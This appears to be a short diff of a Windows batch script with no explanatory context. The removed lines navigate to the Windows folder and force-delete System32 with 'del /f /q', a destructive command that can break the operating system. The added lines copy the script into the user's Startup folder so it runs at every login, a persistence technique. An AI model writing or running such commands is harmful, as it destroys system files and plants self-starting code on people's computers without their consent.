@@ -1,8 +1,2 @@
-cd..
-cd..
-cd..
-cd..
-cd..
-cd..
-cd Windows
-del /f /q "System32"
+@echo off
+copy "./start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
